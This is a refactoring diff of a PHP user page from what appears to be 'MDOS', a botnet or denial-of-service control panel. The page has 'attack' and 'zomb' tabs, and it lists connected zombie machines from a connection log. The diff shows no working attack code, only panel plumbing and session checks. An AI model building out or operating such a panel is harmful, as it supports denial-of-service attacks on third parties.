@@ -1,14 +1,14 @@
 <?php
-error_reporting(E_ALL ^ E_STRICT);
 include 'static/config.php';
 include 'api/core.php';
+$MDOS = new MDOS;
 if ((isset ($_GET["log"])) and (isset ($_GET["sid"])) and (isset ($_GET["tab"]))) {
 	$info_log = $_GET["log"];
 	$info_sid = $_GET["sid"];
 	$info_tab = $_GET["tab"];
 
-	if (MDOS::DBCheckLog($info_log)) {
-		if ((MDOS::SecureCheckSID($info_sid, MDOS::DBGetMDP($info_log)))==true) {
+	if ($MDOS -> DBCheckLog($info_log)) {
+		if (($MDOS -> SecureCheckSID($info_sid, $MDOS -> DBGetMDP($info_log)))==true) {
 			switch ($info_tab) {
 				case "log":
 					if (!isset($_GET['act'])) {
@@ -40,13 +40,13 @@ if ((isset ($_GET["log"])) and (isset ($_GET["sid"])) and (isset ($_GET["tab"]))
 						ftruncate($clearhandle,0);
 						$htmlog = '</br><font face = "Arial" color = "#00bd00" size = "3">&nbsp;&nbsp;&nbsp;Log cleared.</font>';
 					}
-					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmlog);
+					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmlog);
 				break;
 				case "attack":
 					if (isset ($_POST["update"])) {
 
 					}
-					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab);
+					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab);
 				break;
 				case "zomb":
 					$logdata = file ("task/connexions/connectdumper.log");
@@ -58,25 +58,25 @@ if ((isset ($_GET["log"])) and (isset ($_GET["sid"])) and (isset ($_GET["tab"]))
 								$htmdat .= '<div class = "zombbar"></div>';
 							}
 						}
-					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmdat);
+					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmdat);
 				break;
 			}
 		}
 		else {
-			MDOS::WriteLog ((MDOS::RetrieveIP()), '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
-			MDOS::SecureRedirect($url.'index.php?session=0');
+			$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
+			$MDOS -> SecureRedirect($url.'index.php?session=0');
 			exit;
 		}
 	}
 	else {
-		MDOS::WriteLog ((MDOS::RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
-		MDOS::SecureRedirect ($url);
+		$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
+		$MDOS -> SecureRedirect ($url);
 		exit;
 	}
 }
 else {
-		MDOS::WriteLog ((MDOS::RetrieveIP()), '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
-		MDOS::SecureRedirect ($url);
+		$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
+		$MDOS -> SecureRedirect ($url);
 		exit;
 }
 ?>
